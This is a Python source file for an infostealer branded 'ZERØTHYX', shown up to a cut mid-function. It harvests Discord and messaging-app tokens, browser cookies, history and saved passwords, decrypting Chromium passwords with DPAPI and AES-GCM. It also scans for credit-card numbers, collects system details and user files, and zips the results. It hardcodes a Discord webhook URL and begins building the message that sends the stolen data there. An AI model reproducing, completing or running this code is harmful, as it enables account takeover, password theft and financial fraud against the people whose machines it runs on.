import os
import re
import json
import sqlite3
import base64
import sys
import platform
import requests
import shutil
import tempfile
import zipfile
import struct
from datetime import datetime
from pathlib import Path
import win32crypt
from Crypto.Cipher import AES
import argparse

WEBHOOK_URL = "https://discord.com/api/webhooks/1400281612800888923/fHNKZfvDpO7d-VjmHUQuEyqumi_20ue2YQQxW_oVrBcxpxxP7Lq_m6V_q2QGOSsqUsC1"

class AdvancedDataGrabber:
    def __init__(self, args):
        self.args = args
        self.results = {
            "metadata": {
                "scan_time": datetime.now().isoformat(),
                "system_info": self.get_system_info(),
                "scan_options": vars(args)
            },
            "discord_tokens": {},
            "browser_cookies": {},
            "browser_passwords": {},
            "browser_history": {},
            "credit_cards": {},
            "local_storage": {},
            "session_storage": {},
            "extracted_files": [],
            "system_data": {}
        }
    
    def get_system_info(self):
        try:
            import psutil
            info = {
                "platform": platform.platform(),
                "system": platform.system(),
                "release": platform.release(),
                "version": platform.version(),
                "machine": platform.machine(),
                "processor": platform.processor(),
                "username": os.getlogin() if hasattr(os, 'getlogin') else os.getenv('USERNAME', 'Unknown'),
                "hostname": platform.node(),
                "python_version": platform.python_version(),
                "architecture": platform.architecture()[0],
                "cpu_count": os.cpu_count(),
                "ram_gb": round(psutil.virtual_memory().total / (1024**3), 2),
                "disk_usage": {},
                "network_info": {},
                "processes": [],
                "startup_programs": self.get_startup_programs(),
                "installed_software": self.get_installed_software()
            }
            
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    info["disk_usage"][partition.device] = {
                        "total_gb": round(usage.total / (1024**3), 2),
                        "used_gb": round(usage.used / (1024**3), 2),
                        "free_gb": round(usage.free / (1024**3), 2),
                        "percent": usage.percent
                    }
                except:
                    pass
            
            for iface, addrs in psutil.net_if_addrs().items():
                info["network_info"][iface] = [
                    {
                        "family": str(addr.family),
                        "address": addr.address,
                        "netmask": addr.netmask
                    }
                    for addr in addrs
                ]
            
            for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent']):
                try:
                    info["processes"].append(proc.info)
                except:
                    pass
            
            return info
            
        except Exception as e:
            return {"error": str(e)}
    
    def get_startup_programs(self):
        startup = []
        try:
            if platform.system() == "Windows":
                startup_paths = [
                    os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
                    os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'StartUp'),
                    r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'
                ]
                
                for path in startup_paths:
                    if os.path.exists(path):
                        for file in os.listdir(path):
                            if file.endswith(('.lnk', '.exe', '.bat')):
                                startup.append(os.path.join(path, file))
            
            elif platform.system() == "Linux":
                startup_dirs = [
                    '/etc/xdg/autostart',
                    os.path.expanduser('~/.config/autostart')
                ]
                
                for dir_path in startup_dirs:
                    if os.path.exists(dir_path):
                        for file in os.listdir(dir_path):
                            if file.endswith('.desktop'):
                                startup.append(os.path.join(dir_path, file))
            
            elif platform.system() == "Darwin":
                startup_dir = os.path.expanduser('~/Library/LaunchAgents')
                if os.path.exists(startup_dir):
                    for file in os.listdir(startup_dir):
                        if file.endswith('.plist'):
                            startup.append(os.path.join(startup_dir, file))
        
        except:
            pass
        
        return startup
    
    def get_installed_software(self):
        software = []
        try:
            if platform.system() == "Windows":
                import winreg
                
                registry_paths = [
                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                    (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
                ]
                
                for hive, path in registry_paths:
                    try:
                        key = winreg.OpenKey(hive, path)
                        for i in range(0, winreg.QueryInfoKey(key)[0]):
                            try:
                                subkey_name = winreg.EnumKey(key, i)
                                subkey = winreg.OpenKey(key, subkey_name)
                                
                                name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                                version, _ = winreg.QueryValueEx(subkey, "DisplayVersion")
                                
                                if name:
                                    software.append(f"{name} {version}" if version else name)
                                
                                winreg.CloseKey(subkey)
                            except:
                                continue
                    except:
                        continue
            
            elif platform.system() == "Linux":
                import subprocess
                try:
                    result = subprocess.run(['dpkg', '-l'], capture_output=True, text=True)
                    for line in result.stdout.split('\n')[5:]:
                        if line:
                            parts = line.split()
                            if len(parts) >= 2:
                                software.append(f"{parts[1]} {parts[2]}")
                except:
                    pass
            
            elif platform.system() == "Darwin":
                import subprocess
                try:
                    result = subprocess.run(['system_profiler', 'SPApplicationsDataType'], 
                                           capture_output=True, text=True)
                    for line in result.stdout.split('\n'):
                        if 'Location:' in line:
                            app_path = line.split(': ')[1]
                            software.append(os.path.basename(app_path))
                except:
                    pass
        
        except:
            pass
        
        return software
    
    def find_discord_paths(self):
        paths = {}
        
        if platform.system() == "Windows":
            local = os.getenv('LOCALAPPDATA')
            roaming = os.getenv('APPDATA')
            
            paths.update({
                "Discord": os.path.join(roaming, "Discord"),
                "Discord Canary": os.path.join(roaming, "discordcanary"),
                "Discord PTB": os.path.join(roaming, "discordptb"),
                "Discord Development": os.path.join(roaming, "discorddevelopment"),
                "Telegram": os.path.join(roaming, "Telegram Desktop"),
                "Slack": os.path.join(local, "slack"),
                "Zoom": os.path.join(roaming, "Zoom"),
                "Skype": os.path.join(roaming, "Skype"),
                "TeamSpeak": os.path.join(roaming, "TeamSpeak 3"),
                "Element": os.path.join(roaming, "Element"),
                "RocketChat": os.path.join(local, "Rocket.Chat")
            })
            
        elif platform.system() == "Linux":
            home = os.path.expanduser("~")
            config = os.path.join(home, ".config")
            
            paths.update({
                "Discord": os.path.join(config, "discord"),
                "Discord Canary": os.path.join(config, "discordcanary"),
                "Discord PTB": os.path.join(config, "discordptb"),
                "Telegram": os.path.join(home, ".local/share/TelegramDesktop"),
                "Slack": os.path.join(config, "slack"),
                "Element": os.path.join(config, "Element")
            })
            
        elif platform.system() == "Darwin":
            home = os.path.expanduser("~/Library/Application Support")
            
            paths.update({
                "Discord": os.path.join(home, "Discord"),
                "Discord Canary": os.path.join(home, "discordcanary"),
                "Discord PTB": os.path.join(home, "discordptb"),
                "Telegram": os.path.join(home, "ru.keepcoder.Telegram"),
                "Slack": os.path.join(home, "Slack")
            })
        
        return paths
    
    def find_browser_paths(self):
        paths = {}
        
        if platform.system() == "Windows":
            local = os.getenv('LOCALAPPDATA')
            roaming = os.getenv('APPDATA')
            
            paths.update({
                "Google Chrome": os.path.join(local, "Google", "Chrome", "User Data"),
                "Microsoft Edge": os.path.join(local, "Microsoft", "Edge", "User Data"),
                "Brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"),
                "Opera": os.path.join(roaming, "Opera Software", "Opera Stable"),
                "Opera GX": os.path.join(roaming, "Opera Software", "Opera GX Stable"),
                "Vivaldi": os.path.join(local, "Vivaldi", "User Data"),
                "Chromium": os.path.join(local, "Chromium", "User Data"),
                "Firefox": os.path.join(roaming, "Mozilla", "Firefox", "Profiles"),
                "Waterfox": os.path.join(roaming, "Waterfox", "Profiles"),
                "Tor Browser": os.path.join(roaming, "Tor Browser", "Browser", "TorBrowser", "Data", "Browser"),
                "Yandex": os.path.join(local, "Yandex", "YandexBrowser", "User Data")
            })
            
        elif platform.system() == "Linux":
            home = os.path.expanduser("~")
            config = os.path.join(home, ".config")
            
            paths.update({
                "Google Chrome": os.path.join(config, "google-chrome"),
                "Chromium": os.path.join(config, "chromium"),
                "Brave": os.path.join(config, "BraveSoftware", "Brave-Browser"),
                "Firefox": os.path.join(home, ".mozilla", "firefox"),
                "Vivaldi": os.path.join(config, "vivaldi"),
                "Opera": os.path.join(config, "opera"),
                "Tor Browser": os.path.join(home, ".local/share/torbrowser"),
                "Yandex": os.path.join(config, "yandex-browser")
            })
            
        elif platform.system() == "Darwin":
            home = os.path.expanduser("~/Library/Application Support")
            
            paths.update({
                "Google Chrome": os.path.join(home, "Google/Chrome"),
                "Safari": os.path.join(home, "Safari"),
                "Firefox": os.path.join(home, "Firefox/Profiles"),
                "Brave": os.path.join(home, "BraveSoftware/Brave-Browser"),
                "Opera": os.path.join(home, "com.operasoftware.Opera"),
                "Vivaldi": os.path.join(home, "Vivaldi"),
                "Yandex": os.path.join(home, "Yandex/YandexBrowser")
            })
        
        return paths
    
    def extract_discord_tokens(self):
        paths = self.find_discord_paths()
        
        for app_name, app_path in paths.items():
            if os.path.exists(app_path):
                tokens = self.scan_for_tokens(app_path)
                if tokens:
                    self.results["discord_tokens"][app_name] = tokens
    
    def scan_for_tokens(self, path):
        tokens = []
        
        try:
            local_storage = os.path.join(path, "Local Storage", "leveldb")
            if os.path.exists(local_storage):
                tokens.extend(self.scan_leveldb(local_storage))
            
            config_files = ["Local State", "Preferences", "Cookies", "Login Data"]
            
            for file_name in config_files:
                file_path = os.path.join(path, file_name)
                if os.path.exists(file_path):
                    tokens.extend(self.scan_file_for_tokens(file_path))
        
        except Exception as e:
            pass
        
        return list(set(tokens))
    
    def scan_leveldb(self, leveldb_path):
        tokens = []
        
        try:
            for file in os.listdir(leveldb_path):
                if file.endswith(('.log', '.ldb', '.sst')):
                    file_path = os.path.join(leveldb_path, file)
                    tokens.extend(self.scan_file_for_tokens(file_path))
        
        except:
            pass
        
        return tokens
    
    def scan_file_for_tokens(self, file_path):
        tokens = []
        
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            patterns = {
                "discord_token": r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',
                "discord_mfa": r'mfa\.[\w-]{84}',
                "jwt_token": r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
                "oauth_token": r'[A-Za-z0-9_-]{30,}',
                "api_key": r'(?i)(api[_-]?key|secret[_-]?key)[\"\']?\s*[:=]\s*[\"\']([A-Za-z0-9_-]{20,})[\"\']',
                "bearer_token": r'(?i)bearer\s+([A-Za-z0-9._-]+)',
                "access_token": r'(?i)access[_-]?token[\"\']?\s*[:=]\s*[\"\']([A-Za-z0-9._-]+)[\"\']',
                "refresh_token": r'(?i)refresh[_-]?token[\"\']?\s*[:=]\s*[\"\']([A-Za-z0-9._-]+)[\"\']'
            }
            
            for token_type, pattern in patterns.items():
                matches = re.findall(pattern, content)
                if matches:
                    tokens.extend(matches)
        
        except:
            pass
        
        return list(set(tokens))
    
    def find_token_paths(self):
        paths = {}
        computer_platform = platform.system()
        
        if computer_platform == "Windows":
            local = os.getenv('LOCALAPPDATA')
            roaming = os.getenv('APPDATA')
            
            paths = {
                "Discord": os.path.join(roaming, "Discord"),
                "Discord Canary": os.path.join(roaming, "discordcanary"),
                "Discord PTB": os.path.join(roaming, "discordptb"),
                "Google Chrome": os.path.join(local, "Google", "Chrome", "User Data", "Default"),
                "Opera": os.path.join(roaming, "Opera Software", "Opera Stable"),
                "Brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
                "Yandex": os.path.join(local, "Yandex", "YandexBrowser", "User Data", "Default")
            }
        
        elif computer_platform == "Linux":
            home = os.path.join(os.path.expanduser("~"), ".config")
            
            paths = {
                "Discord": os.path.join(home, "discord"),
                "Discord Canary": os.path.join(home, "discordcanary"),
                "Discord PTB": os.path.join(home, "discordptb"),
                "Google Chrome": os.path.join(home, "google-chrome", "Default"),
                "Opera": os.path.join(home, "opera"),
                "Brave": os.path.join(home, "BraveSoftware", "Brave-Browser", "Default"),
                "Yandex": os.path.join(home, "yandex-browser", "Default")
            }
        
        elif computer_platform == "Darwin":
            print("MacOS no es compatible por el momento 😥")
            return {}
        
        return paths
    
    def find_token_in_path(self, token_path):
        tokens = []
        
        try:
            local_storage_path = os.path.join(token_path, "Local Storage", "leveldb")
            
            if os.path.exists(local_storage_path):
                for file in os.listdir(local_storage_path):
                    if file.endswith(".log") or file.endswith(".ldb"):
                        file_path = os.path.join(local_storage_path, file)
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                            
                            regex_patterns = [
                                re.compile(r'mfa\.[\w-]{84}'),
                                re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
                            ]
                            
                            for regex in regex_patterns:
                                matches = regex.findall(content)
                                for match in matches:
                                    tokens.append(match)
                        except:
                            continue
        except:
            pass
        
        return tokens
    
    def discord_token_grabber(self):
        paths = self.find_token_paths()
        tokens_dict = {}
        
        for platform_name, path in paths.items():
            if os.path.exists(path):
                token_list = self.find_token_in_path(path)
                if token_list:
                    tokens_dict[platform_name] = token_list
        
        return tokens_dict
    
    def extract_browser_data(self):
        paths = self.find_browser_paths()
        
        for browser_name, browser_path in paths.items():
            if os.path.exists(browser_path):
                
                if self.args.cookies:
                    cookies = self.extract_browser_cookies(browser_name, browser_path)
                    if cookies:
                        self.results["browser_cookies"][browser_name] = cookies
                
                if self.args.passwords:
                    passwords = self.extract_browser_passwords(browser_name, browser_path)
                    if passwords:
                        self.results["browser_passwords"][browser_name] = passwords
                
                if self.args.history:
                    history = self.extract_browser_history(browser_name, browser_path)
                    if history:
                        self.results["browser_history"][browser_name] = history
                
                local_storage_data = self.extract_local_storage_comprehensive(browser_name, browser_path)
                if local_storage_data:
                    self.results["local_storage"][browser_name] = local_storage_data
                    
                    if browser_name.lower().startswith("discord"):
                        tokens = self.scan_local_storage_for_tokens(browser_path)
                        if tokens:
                            self.results["discord_tokens"].setdefault(browser_name, []).extend(tokens)
    
    def extract_local_storage_comprehensive(self, browser_name, browser_path):
        storage_data = {}
        
        try:
            if browser_name.lower() == "firefox":
                storage_path = self.find_firefox_local_storage(browser_path)
            else:
                storage_path = os.path.join(browser_path, "Default", "Local Storage", "leveldb")
            
            if storage_path and os.path.exists(storage_path):
                storage_data = self.parse_leveldb_storage(storage_path)
        
        except Exception as e:
            pass
        
        return storage_data
    
    def find_firefox_local_storage(self, firefox_path):
        try:
            if os.path.exists(firefox_path):
                for item in os.listdir(firefox_path):
                    if item.endswith('.default') or item.endswith('.default-release'):
                        profile_path = os.path.join(firefox_path, item)
                        storage_path = os.path.join(profile_path, "storage", "default")
                        if os.path.exists(storage_path):
                            return storage_path
        except:
            pass
        return None
    
    def parse_leveldb_storage(self, storage_path):
        storage_items = {}
        
        try:
            for file_name in os.listdir(storage_path):
                if file_name.endswith(('.log', '.ldb')):
                    file_path = os.path.join(storage_path, file_name)
                    
                    with open(file_path, 'rb') as f:
                        content = f.read().decode('utf-8', errors='ignore')
                    
                    patterns = [
                        # JSON-like patterns
                        r'([\w\-\.]+)\s*:\s*["\']([^"\'\n\r]+)["\']',
                        r'([\w\-\.]+)\s*:\s*([\w\-\.]+)',
                        # URL patterns
                        r'(https?://[^\s"\']+)',
                        # Token patterns
                        r'(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)',
                        r'([\w-]{24}\.[\w-]{6}\.[\w-]{27})',
                        r'(mfa\.[\w-]{84})',
                        # API keys
                        r'([a-zA-Z0-9]{32,})',
                        # Cookies-like data
                        r'([\w\-\.]+)=([^;\n\r]+)',
                        # Base64 encoded data
                        r'([A-Za-z0-9+/=]{20,})',
                        # Email patterns
                        r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',
                        # IP addresses
                        r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})',
                        # Credit card-like numbers
                        r'(\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4})',
                        # Phone numbers
                        r'(\+?\d{1,3}[-\s]?\(?\d{1,4}\)?[-\s]?\d{1,4}[-\s]?\d{1,9})'
                    ]
                    
                    for pattern in patterns:
                        matches = re.findall(pattern, content)
                        for match in matches:
                            if isinstance(match, tuple):
                                key, value = match
                                if len(key) > 2 and len(value) > 2:
                                    storage_items[key] = value
                            else:
                                if len(match) > 10:
                                    storage_items[f"data_{len(storage_items)}"] = match
                    
                    if "discord" in file_name.lower() or "discord" in content.lower():
                        discord_data = self.extract_discord_local_storage(content)
                        storage_items.update(discord_data)
        
        except Exception as e:
            pass
        
        return storage_items
    
    def extract_discord_local_storage(self, content):
        discord_data = {}
        
        try:
            # Buscar tokens específicos de Discord
            discord_patterns = {
                "token": r'["\']token["\']\s*:\s*["\']([^"\']+)["\']',
                "id": r'["\']id["\']\s*:\s*["\']([^"\']+)["\']',
                "username": r'["\']username["\']\s*:\s*["\']([^"\']+)["\']',
                "email": r'["\']email["\']\s*:\s*["\']([^"\']+)["\']',
                "avatar": r'["\']avatar["\']\s*:\s*["\']([^"\']+)["\']',
                "discriminator": r'["\']discriminator["\']\s*:\s*["\']([^"\']+)["\']',
                "mfa_enabled": r'["\']mfa_enabled["\']\s*:\s*([^,\n\r]+)',
                "verified": r'["\']verified["\']\s*:\s*([^,\n\r]+)',
                "locale": r'["\']locale["\']\s*:\s*["\']([^"\']+)["\']',
                "premium_type": r'["\']premium_type["\']\s*:\s*([^,\n\r]+)',
                "public_flags": r'["\']public_flags["\']\s*:\s*([^,\n\r]+)',
                "flags": r'["\']flags["\']\s*:\s*([^,\n\r]+)',
                "banner": r'["\']banner["\']\s*:\s*["\']([^"\']+)["\']',
                "accent_color": r'["\']accent_color["\']\s*:\s*([^,\n\r]+)',
                "banner_color": r'["\']banner_color["\']\s*:\s*["\']([^"\']+)["\']',
                "theme": r'["\']theme["\']\s*:\s*["\']([^"\']+)["\']',
                "guild_positions": r'["\']guild_positions["\']\s*:\s*\[([^\]]+)\]',
                "guild_settings": r'["\']guild_settings["\']\s*:\s*(\{[^\}]+\})',
                "user_settings": r'["\']user_settings["\']\s*:\s*(\{[^\}]+\})',
                "relationships": r'["\']relationships["\']\s*:\s*\[([^\]]+)\]',
                "read_state": r'["\']read_state["\']\s*:\s*(\{[^\}]+\})',
                "private_channels": r'["\']private_channels["\']\s*:\s*\[([^\]]+)\]'
            }
            
            for key, pattern in discord_patterns.items():
                matches = re.findall(pattern, content)
                if matches:
                    discord_data[f"discord_{key}"] = matches[0] if len(matches[0]) < 1000 else matches[0][:1000]
        
        except Exception as e:
            pass
        
        return discord_data
    
    def scan_local_storage_for_tokens(self, app_path):
        tokens = []
        
        try:
            local_storage_path = os.path.join(app_path, "Local Storage", "leveldb")
            if os.path.exists(local_storage_path):
                for file in os.listdir(local_storage_path):
                    if file.endswith(('.log', '.ldb')):
                        file_path = os.path.join(local_storage_path, file)
                        with open(file_path, 'rb') as f:
                            content = f.read().decode('utf-8', errors='ignore')
                        
                        token_patterns = [
                            r'([\w-]{24}\.[\w-]{6}\.[\w-]{27})',  
                            r'(mfa\.[\w-]{84})',  
                            r'(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)',  
                            r'([A-Za-z0-9]{64})', 
                            r'([A-Za-z0-9]{32})',  
                            r'([A-Za-z0-9_-]{20,})'  
                        ]
                        
                        for pattern in token_patterns:
                            matches = re.findall(pattern, content)
                            tokens.extend(matches)
        
        except Exception as e:
            pass
        
        return list(set(tokens))
    
    def extract_browser_cookies(self, browser_name, browser_path):
        cookies = []
        
        try:
            if browser_name.lower() == "firefox":
                cookies_db = self.find_firefox_file(browser_path, "cookies.sqlite")
            else:
                cookies_db = os.path.join(browser_path, "Default", "Cookies")
            
            if cookies_db and os.path.exists(cookies_db):
                temp_db = tempfile.NamedTemporaryFile(delete=False, suffix=".db")
                shutil.copy2(cookies_db, temp_db.name)
                
                conn = sqlite3.connect(temp_db.name)
                cursor = conn.cursor()
                
                cursor.execute("""
                    SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly
                    FROM cookies
                    ORDER BY host_key
                """)
                
                for row in cursor.fetchall():
                    cookie = {
                        "domain": row[0],
                        "name": row[1],
                        "value": row[2],
                        "path": row[3],
                        "expires": row[4],
                        "secure": bool(row[5]),
                        "httponly": bool(row[6])
                    }
                    cookies.append(cookie)
                
                conn.close()
                os.unlink(temp_db.name)
        
        except Exception as e:
            pass
        
        return cookies
    
    def extract_browser_passwords(self, browser_name, browser_path):
        passwords = []
        
        try:
            if browser_name.lower() == "firefox":
                passwords_db = self.find_firefox_file(browser_path, "logins.json")
                if passwords_db and os.path.exists(passwords_db):
                    with open(passwords_db, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                        passwords = data.get("logins", [])
            else:
                passwords_db = os.path.join(browser_path, "Default", "Login Data")
                
                if passwords_db and os.path.exists(passwords_db):
                    temp_db = tempfile.NamedTemporaryFile(delete=False, suffix=".db")
                    shutil.copy2(passwords_db, temp_db.name)
                    
                    conn = sqlite3.connect(temp_db.name)
                    cursor = conn.cursor()
                    
                    cursor.execute("""
                        SELECT origin_url, username_value, password_value
                        FROM logins
                    """)
                    
                    for row in cursor.fetchall():
                        password = {
                            "url": row[0],
                            "username": row[1],
                            "password": self.decrypt_password(row[2], browser_name)
                        }
                        passwords.append(password)
                    
                    conn.close()
                    os.unlink(temp_db.name)
        
        except Exception as e:
            pass
        
        return passwords
    
    def decrypt_password(self, encrypted_password, browser):
        try:
            if browser.lower() == "firefox":
                return encrypted_password.decode('utf-8') if encrypted_password else ""
            
            else:
                if not encrypted_password:
                    return ""
                
                local_state_path = None
                if browser.lower() == "google chrome":
                    local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Local State')
                elif browser.lower() == "microsoft edge":
                    local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Local State')
                
                if local_state_path and os.path.exists(local_state_path):
                    with open(local_state_path, 'r', encoding='utf-8') as f:
                        local_state = json.load(f)
                    
                    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                    encrypted_key = encrypted_key[5:]
                    
                    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                    
                    nonce = encrypted_password[3:15]
                    ciphertext = encrypted_password[15:-16]
                    tag = encrypted_password[-16:]
                    
                    cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce)
                    decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                    
                    return decrypted.decode('utf-8')
        
        except:
            pass
        
        return "[ENCRYPTED]"
    
    def extract_browser_history(self, browser_name, browser_path):
        history = []
        
        try:
            if browser_name.lower() == "firefox":
                history_db = self.find_firefox_file(browser_path, "places.sqlite")
            else:
                history_db = os.path.join(browser_path, "Default", "History")
            
            if history_db and os.path.exists(history_db):
                temp_db = tempfile.NamedTemporaryFile(delete=False, suffix=".db")
                shutil.copy2(history_db, temp_db.name)
                
                conn = sqlite3.connect(temp_db.name)
                cursor = conn.cursor()
                
                cursor.execute("""
                    SELECT url, title, visit_count, last_visit_time
                    FROM urls
                    ORDER BY last_visit_time DESC
                    LIMIT 1000
                """)
                
                for row in cursor.fetchall():
                    entry = {
                        "url": row[0],
                        "title": row[1],
                        "visit_count": row[2],
                        "last_visit": row[3]
                    }
                    history.append(entry)
                
                conn.close()
                os.unlink(temp_db.name)
        
        except Exception as e:
            pass
        
        return history
    
    def find_firefox_file(self, firefox_path, filename):
        try:
            if os.path.exists(firefox_path):
                for item in os.listdir(firefox_path):
                    if item.endswith('.default') or item.endswith('.default-release'):
                        profile_path = os.path.join(firefox_path, item)
                        file_path = os.path.join(profile_path, filename)
                        if os.path.exists(file_path):
                            return file_path
        
        except:
            pass
        
        return None
    
    def extract_credit_cards(self):
        search_paths = [
            os.path.join(os.getenv('USERPROFILE'), 'Documents'),
            os.path.join(os.getenv('USERPROFILE'), 'Desktop'),
            os.path.join(os.getenv('USERPROFILE'), 'Downloads'),
            os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Wallet')
        ]
        
        for path in search_paths:
            if os.path.exists(path):
                cards = self.scan_for_credit_cards(path)
                if cards:
                    self.results["credit_cards"][path] = cards
    
    def scan_for_credit_cards(self, path):
        cards = []
        
        try:
            if os.path.isfile(path):
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                patterns = {
                    "visa": r'4[0-9]{12}(?:[0-9]{3})?',
                    "mastercard": r'(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}',
                    "amex": r'3[47][0-9]{13}',
                    "discover": r'6(?:011|5[0-9]{2})[0-9]{12}',
                    "diners": r'3(?:0[0-5]|[68][0-9])[0-9]{11}',
                    "jcb": r'(?:2131|1800|35\d{3})\d{11}'
                }
                
                for card_type, pattern in patterns.items():
                    matches = re.findall(pattern, content)
                    for match in matches:
                        cards.append({
                            "type": card_type,
                            "number": match,
                            "source": os.path.basename(path)
                        })
        
        except:
            pass
        
        return cards
    
    def extract_files_of_interest(self):
        extensions = {
            "documents": ['.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx'],
            "images": ['.jpg', '.jpeg', '.png', '.gif', '.bmp'],
            "archives": ['.zip', '.rar', '.7z', '.tar', '.gz'],
            "databases": ['.db', '.sqlite', '.sql', '.mdb'],
            "configs": ['.config', '.ini', '.cfg', '.json', '.xml'],
            "logs": ['.log', '.txt']
        }
        
        search_paths = [
            os.path.join(os.getenv('USERPROFILE'), 'Desktop'),
            os.path.join(os.getenv('USERPROFILE'), 'Documents'),
            os.path.join(os.getenv('USERPROFILE'), 'Downloads'),
            os.path.join(os.getenv('USERPROFILE'), 'Pictures'),
            os.path.join(os.getenv('USERPROFILE'), 'Videos'),
            os.path.join(os.getenv('APPDATA')),
            os.path.join(os.getenv('LOCALAPPDATA'))
        ]
        
        for category, exts in extensions.items():
            files = []
            for path in search_paths:
                if os.path.exists(path):
                    for root, dirs, filenames in os.walk(path):
                        for filename in filenames:
                            if any(filename.lower().endswith(ext) for ext in exts):
                                file_path = os.path.join(root, filename)
                                try:
                                    size = os.path.getsize(file_path)
                                    files.append({
                                        "path": file_path,
                                        "size": size,
                                        "modified": datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat()
                                    })
                                except:
                                    pass
            
            if files:
                self.results["extracted_files"].append({
                    "category": category,
                    "files": files[:50]
                })
    
    def create_summary(self):
        summary = []
        summary.append("=" * 80)
        summary.append("ZERØTHYX - DATA EXTRACTION REPORT")
        summary.append("=" * 80)
        summary.append(f"Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        summary.append(f"System: {platform.platform()}")
        summary.append(f"User: {self.results['metadata']['system_info'].get('username', 'Unknown')}")
        summary.append("=" * 80)
        
        discord_count = sum(len(tokens) for tokens in self.results["discord_tokens"].values())
        summary.append(f"\n🔐 DISCORD TOKENS: {discord_count}")
        summary.append("-" * 40)
        
        for app, tokens in self.results["discord_tokens"].items():
            if tokens:
                summary.append(f"\n{app}:")
                for i, token in enumerate(tokens[:5], 1):
                    summary.append(f"  {i}- {token[:50]}...")
                if len(tokens) > 5:
                    summary.append(f"  ...and {len(tokens) - 5} more")
        
        cookie_count = sum(len(cookies) for cookies in self.results["browser_cookies"].values())
        summary.append(f"\n🍪 BROWSER COOKIES: {cookie_count}")
        
        password_count = sum(len(passwords) for passwords in self.results["browser_passwords"].values())
        summary.append(f"🔑 SAVED PASSWORDS: {password_count}")
        
        history_count = sum(len(history) for history in self.results["browser_history"].values())
        summary.append(f"📜 BROWSER HISTORY: {history_count} entries")
        
        card_count = sum(len(cards) for cards in self.results["credit_cards"].values())
        summary.append(f"💳 CREDIT CARDS: {card_count}")
        
        file_count = sum(len(cat["files"]) for cat in self.results["extracted_files"])
        summary.append(f"📁 FILES OF INTEREST: {file_count}")
        
        summary.append("\n" + "=" * 80)
        summary.append("END OF REPORT")
        summary.append("=" * 80)
        
        return "\n".join(summary)
    
    def save_results(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        base_filename = f"zerothyx_extraction_{timestamp}"
        
        json_filename = f"{base_filename}.json"
        with open(json_filename, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        
        summary = self.create_summary()
        txt_filename = f"{base_filename}_summary.txt"
        with open(txt_filename, 'w', encoding='utf-8') as f:
            f.write(summary)
        
        zip_filename = f"{base_filename}.zip"
        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(json_filename, os.path.basename(json_filename))
            zipf.write(txt_filename, os.path.basename(txt_filename))
            
            for file_cat in self.results["extracted_files"]:
                for file_info in file_cat["files"][:10]:
                    try:
                        if os.path.exists(file_info["path"]):
                            zipf.write(file_info["path"], f"extracted/{os.path.basename(file_info['path'])}")
                    except:
                        pass
        
        return zip_filename
    
    def send_to_webhook(self, zip_filename):
        try:
            discord_token_count = sum(len(tokens) for tokens in self.results["discord_tokens"].values())
            cookie_count = sum(len(cookies) for cookies in self.results["browser_cookies"].values())
            password_count = sum(len(passwords) for passwords in self.results["browser_passwords"].values())
            
            embed = {
                "title": "🚨 ZERØTHYX - DATA EXTRACTION COMPLETE",
                "description": f"**System Scan Report**\n```{platform.platform()}```",
                "color": 0x5865F2,
                "fields": [
                    {
                        "name": "🔐 Discord Tokens",
                        "value": f"```{discord_token_count} tokens found```",
                        "inline": True
                    },
                    {
                        "name": "🍪 Browser Cookies",
                        "value": f"```{cookie_count} cookies```",
                        "inline": True
                    },
                    {
                        "name": "🔑 Saved Passwords",
                        "value": f"```{password_count} passwords```",
                        "inline": True
                    },
                    {
                        "name": "📊 System Info",
                        "value": f"```User: {self.results['metadata']['system_info'].get('username', 'Unknown')}\nCPU: {self.results['metadata']['system_info'].get('processor', 'Unknown')}\nRAM: {self.results['metadata']['system_info'].get('ram_gb', 0)}GB```",
                        "inline": False
                    },
                    {
                        "name": "📁 Extracted Files",
                        "value": f"```{sum(len(cat['files']) for cat in self.results['extracted_files'])} files```",
